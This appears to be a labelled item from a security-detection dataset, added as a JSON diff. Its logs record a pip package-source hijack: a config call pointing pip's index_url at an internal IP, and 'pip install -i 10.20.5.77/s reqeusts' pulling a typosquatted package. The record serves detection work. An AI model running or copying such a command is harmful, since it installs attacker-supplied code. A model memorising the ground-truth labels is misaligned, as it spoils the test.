@@ -1,0 +1,33 @@
+{
+ "unit": 1134,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "包管理器源劫持（pip index-url 指向攻击者私服）",
+ "sources": [
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-10 01:20:35",
+   "source": "rasp",
+   "log_id": "RASP0515832",
+   "content": "https://app-django-190.ops-corp.com/api/v1/pip/config {\"index_url\": \"10.20.5.77/simple\", \"tool\": \"pip\"} Mozill",
+   "event_id": "1134-RASP0515832"
+  },
+  {
+   "timestamp": "2026-07-10 01:22:03",
+   "source": "hids",
+   "log_id": "HID0505256",
+   "content": "pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip",
+   "event_id": "1134-HID0505256"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
